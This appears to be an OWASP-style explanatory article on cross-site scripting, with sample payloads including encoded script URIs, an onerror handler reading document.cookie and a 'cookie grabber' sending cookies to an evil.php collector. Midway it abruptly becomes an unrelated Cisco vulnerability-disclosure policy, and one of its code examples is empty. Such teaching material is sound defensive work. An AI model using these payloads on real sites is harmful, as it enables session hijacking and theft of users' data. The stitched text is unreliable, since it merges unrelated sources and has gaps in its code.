# Cross Site Scripting (XSS)

**Author:** KirstenS

**Contributor(s):** Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon, kingthorin, Vikas Khanna. Grant Ongers

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection, in which
malicious scripts are injected into otherwise benign and trusted
websites. XSS attacks occur when an attacker uses a web application to
send malicious code, generally in the form of a browser side script, to
a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a
user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting
user. The end user’s browser has no way to know that the script should
not be trusted, and will execute the script. Because it thinks the
script came from a trusted source, the malicious script can access any
cookies, session tokens, or other sensitive information retained by the
browser and used with that site. These scripts can even rewrite the
content of the HTML page. For more details on the different types of XSS
flaws, see: [Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting).

## Description

Cross-Site Scripting (XSS) attacks occur when:

1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.

The malicious content sent to the web browser often takes the form of a
segment of JavaScript, but may also include HTML, Flash, or any other
type of code that the browser may execute. The variety of attacks based
on XSS is almost limitless, but they commonly include transmitting
private data, like cookies or other session information, to the
attacker, redirecting the victim to web content controlled by the
attacker, or performing other malicious operations on the user’s machine
under the guise of the vulnerable site.

### Reflected and Stored XSS Attacks

XSS attacks can generally be categorized into two categories: reflected
and stored. There is a third, much less well-known type of XSS attack
called [DOM Based XSS](../DOM_Based_XSS) that is discussed
separately [here](../DOM_Based_XSS).

#### Reflected XSS Attacks

Reflected attacks are those where the injected script is reflected off
the web server, such as in an error message, search result, or any other
response that includes some or all of the input sent to the server as
part of the request. Reflected attacks are delivered to victims via
another route, such as in an e-mail message, or on some other website.
When a user is tricked into clicking on a malicious link, submitting a
specially crafted form, or even just browsing to a malicious site, the
injected code travels to the vulnerable web site, which reflects the
attack back to the user’s browser. The browser then executes the code
because it came from a “trusted” server. Reflected XSS is also sometimes
referred to as Non-Persistent or Type-I XSS (the attack is carried out
through a single request / response cycle).

#### Stored XSS Attacks

Stored attacks are those where the injected script is permanently stored
on the target servers, such as in a database, in a message forum,
visitor log, comment field, etc. The victim then retrieves the malicious
script from the server when it requests the stored information. Stored
XSS is also sometimes referred to as Persistent or Type-II XSS.

#### Blind Cross-site Scripting

Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker’s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed.
Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.

### Other Types of XSS Vulnerabilities

In addition to Stored and Reflected XSS, another type of XSS, [DOM Based
XSS](../DOM_Based_XSS) was identified by [Amit Klein
in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP
recommends the XSS categorization as described in the OWASP Article:
[Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting), which covers all
these XSS terms, organizing them into a matrix of Stored vs. Reflected
XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
XSS.

#### XSS Attack Consequences

The consequence of an XSS attack is the same regardless of whether it is
stored or reflected ([or DOM Based](../DOM_Based_XSS)). The
difference is in how the payload arrives at the server. Do not be fooled
into thinking that a “read-only” or “brochureware” site is not
vulnerable to serious reflected XSS attacks. XSS can cause a variety of
problems for the end user that range in severity from an annoyance to
complete account compromise. The most severe XSS attacks involve
disclosure of the user’s session cookie, allowing an attacker to hijack
the user’s session and take over the account. Other damaging attacks
include the disclosure of end user files, installation of Trojan horse
programs, redirecting the user to some other page or site, or modifying
presentation of content. An XSS vulnerability allowing an attacker to
modify a press release or news item could affect a company’s stock price
or lessen consumer confidence. An XSS vulnerability on a pharmaceutical
site could allow an attacker to modify dosage information resulting in
an overdose. For more information on these types of attacks see
[Content\_Spoofing](../Content_Spoofing).

### How to Determine If You Are Vulnerable

XSS flaws can be difficult to identify and remove from a web
application. The best way to find flaws is to perform a security review
of the code and search for all places where input from an HTTP request
could possibly make its way into the HTML output. Note that a variety of
different HTML tags can be used to transmit a malicious JavaScript.
Nessus, Nikto, and some other available tools can help scan a website
for these flaws, but can only scratch the surface. If one part of a
website is vulnerable, there is a high likelihood that there are other
problems as well.

### How to Protect Yourself

The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat
Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Also, it’s crucial that you turn off HTTP TRACE support on all web
servers. An attacker can steal cookie data via Javascript even when
document.cookie is disabled or not supported by the client. This attack
is mounted when a user posts a malicious script to a forum so when
another user clicks the link, an asynchronous HTTP Trace call is
triggered which collects the user’s cookie information from the server,
and then sends it over to another malicious server that collects the
cookie information so the attacker can mount a session hijack attack.
This is easily mitigated by removing support for HTTP TRACE on all web
servers.

The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of
reusable security components in several languages, including validation
and escaping routines to prevent parameter tampering and the injection
of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training
application has lessons on Cross-Site Scripting and data encoding.

### Alternate XSS Syntax

#### XSS Using Script in Attributes

XSS attacks may be conducted without using `<script>...</script>`
tags. Other tags will do exactly the same thing, for example:
`<body onload=alert('test1')>` or other attributes like: `onmouseover`, `onerror`.

##### onmouseover

`<b onmouseover=alert('Wufff!')>click me!</b>`

##### onerror

`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

#### XSS Using Script Via Encoded URI Schemes

If we need to hide against web application filters we may try to encode
string characters, e.g.: `a=&\#X41` (UTF-8) and use it in `IMG` tags:

`<IMG SRC=j&#X41vascript:alert('test2')>`

There are many different UTF-8 encoding notations that give us even more
possibilities.

#### XSS Using Code Encoding

We may encode our script in base64 and place it in `META` tag. This way we
get rid of `alert()` totally. More information about this method can be
found in RFC 2397

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

```

These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
encyclopedia of the alternate XSS syntax attack.

## Examples

Cross-site scripting attacks may occur anywhere that possibly malicious
users are allowed to post unregulated material to a trusted website for
the consumption of other valid users.

The most common example can be found in bulletin-board websites which
provide web based mailing list-style functionality.

### Example 1

The following JSP code segment reads an employee ID, eid, from an HTTP
request and displays it to the user.

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```

The code in this example operates correctly if `eid` contains only
standard alphanumeric text. If `eid` has a value that includes
meta-characters or source code, then the code will be executed by the
web browser as it displays the HTTP response.

Initially, this might not appear to be much of a vulnerability. After
all, why would someone enter a URL that causes malicious code to run on
their own computer? The real danger is that an attacker will create the
malicious URL, then use e-mail or social engineering tricks to lure
victims into visiting a link to the URL. When victims click the link,
they unwittingly reflect the malicious content through the vulnerable
web application back to their own computers. This mechanism of
exploiting vulnerable web applications is known as Reflected XSS.

### Example 2

The following JSP code segment queries a database for an employee with a
given ID and prints the corresponding employee’s name.

```

```

As in Example 1, this code functions correctly when the values of name
are well-behaved, but it does nothing to prevent exploits if they are
not. Again, this code can appear less dangerous because the value of
name is read from a database, whose contents are apparently managed by
the application. However, if the value of name originates from
user-supplied data, then the database can be a conduit for malicious
content. Without proper input validation on all data stored in the
database, an attacker can execute malicious commands in the user’s web
browser. This type of exploit, known as Stored XSS, is particularly
insidious because the indirection caused by the data store makes it more
difficult to identify the threat and increases the possibility that the
attack will affect multiple users. XSS got its start in this form with
websites that offered a “guestbook” to visitors. Attackers would include
JavaScript in their guestbook entries, and all subsequent visitors to
the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that
includes unvalidated data in an HTTP response. There are three vectors
by which an XSS attack can reach a victim:

* As in Example 1, data is read directly from the HTTP request and
  reflected back in the HTTP response. Reflected XSS exploits occur
  when an attacker causes a user to supply dangerous content to a
  vulnerable web application, which is then reflected back to the user
  and executed by the web browser. The most common mechanism for
  delivering malicious content is to include it as a parameter in a
  URL that is posted publicly or e-mailed directly to victims. URLs
  constructed in this manner constitute the core of many phishing
  schemes, whereby an attacker convinces victims to visit a URL that
  refers to a vulnerable site. After the site reflects the attacker’s
  content back to the user, the content is executed and proceeds to
  transfer private information, such as cookies that may include
  session information, from the user’s machine to the attacker or
  perform other nefarious activities.
* As in Example 2, the application stores dangerous data in a database
  or other trusted data store. The dangerous data is subsequently read
  back into the application and included in dynamic content. Stored
  XSS exploits occur when an attacker injects dangerous content into a
  data store that is later read and included in dynamic content. From
  an attacker’s perspective, the optimal place to inject malicious
  content is in an area that is displayed to either many users or
  particularly interesting users. Interesting users typically have
  elevated privileges in the application or interact with sensitive
  data that is valuable to the attacker. If one of these users
  executes malicious content, the attacker may be able to perform
  privileged operations on behalf of the user or gain access to
  sensitive data belonging to the user.
* A source outside the application stores dangerous data in a database
  or other data store, and the dangerous data is subsequently read
  back into the application as trusted data and included in dynamic
  content.

### Attack Examples

**Example 1: Cookie Grabber**

If the application doesn’t validate the input data, the attacker can
easily steal a cookie from an authenticated user. All the attacker has
to do is to place the following code in any posted input(ie: message
boards, private messages, user profiles):

```
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>

```

The above code will pass an escaped content of the cookie (according to
RFC content must be escaped before sending it via HTTP protocol with GET
method) to the evil.php script in “cakemonster” variable. The attacker
then checks the results of their evil.php script (a cookie grabber script
will usually write the cookie to a file) and use it.

### Error Page Example

Let’s assume that we have an error page, which is handling requests for
a non existing pages, a classic 404 error page. We may use the code
below as an example to inform user about what specific page is missing:

```
<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>

```

Let’s see how it works: `http://testsite.test/file_which_not_exist`
In response we get: `Not found: /file_which_not_exist`

Now we will try to force the error page to include our code: `http://testsite.test/<script>alert("TEST");</script>`
The result is: `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`

We have successfully injected the code, our XSS! What does it mean? For
example, that we may use this flaw to try to steal a user’s session
cookie.

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |
| **Hours** | 24 hours a day, 7 days a week |

## Receiving Security Vulnerability Information from Cisco

There are several ways to stay connected and receive the latest security vulnerability information from Cisco. Customers should review the following table, and subsequent summaries, to determine the appropriate option for them:

| **Cisco.com** | <https://www.cisco.com/security/> |
| --- | --- |
| **Email** | cust-security-announce@cisco.com |
| **RSS** | <https://sec.cloudapps.cisco.com/security/center/rss.x?i=44> |
| **Cisco PSIRT openVuln API** | [https://developer.cisco.com/site/PSIRT/](https://developer.cisco.com/site/PSIRT) |
| **My Notifications** | <https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html> |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

### **RSS Feeds**

Cisco security vulnerability information is also available via RSS feeds from Cisco.com. These feeds are free and do not require an active Cisco.com registration. For information on how to subscribe to the RSS feeds, visit the [Cisco Security RSS Feeds page](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44).

### **Cisco PSIRT openVuln API**

The Cisco PSIRT openVuln application programming interface (API) is a RESTful API that conforms to the [representational state transfer](https://restfulapi.net/) (REST) software architectural style and allows customers to obtain Cisco security vulnerability information in different machine-consumable formats. To learn about accessing and using the API, visit the [PSIRT page](https://developer.cisco.com/site/PSIRT) on the Cisco DevNet website.

### **My Notifications**

The [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) allows registered Cisco.com users to subscribe to and receive important Cisco product and technology information, including Cisco Security Advisories. This service provides an improved unified subscription experience, allowing users to choose the timing of notifications as well as the notification delivery method (email or RSS feed). The level of access will be determined by the subscriber's relationship with Cisco.

### Creating a Notification

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
